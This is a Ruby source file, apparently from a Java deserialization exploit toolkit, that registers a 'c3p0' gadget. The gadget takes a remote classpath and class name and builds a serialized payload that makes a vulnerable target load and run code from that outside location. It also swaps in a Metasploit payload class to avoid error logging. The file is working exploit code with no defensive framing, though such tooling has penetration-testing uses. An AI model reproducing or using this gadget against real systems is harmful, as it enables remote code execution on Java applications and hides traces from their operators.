

require_relative '../payloads/c3p0'

class C3P0 < Java::Gadgets::Gadget
  def id
    'c3p0'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('c3p0')

    if params.fetch('classpath', nil).nil? || params.fetch('class', nil).nil?
      return false
    end

    true
  end

  def targets
    ['classloading']
  end

  def create(ctx, params: {})
    if ctx.flag?('c3p0-legacy')
      ctx.reg.load('model/c3p0-legacy.json')
    else
      ctx.reg.load('model/c3p0.json')
    end

    if !params.fetch('classpath', nil).nil? && !params.fetch('class', nil).nil?

      cls = params['class']
      if cls == 'metasploit.LoadPayload'
        # avoids some error logging
        cls = 'metasploit.ObjectFactoryPayload'
      end
      Java::Serialize::Payloads::C3P0.make_classload(params['classpath'], cls)
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  C3P0.new
)
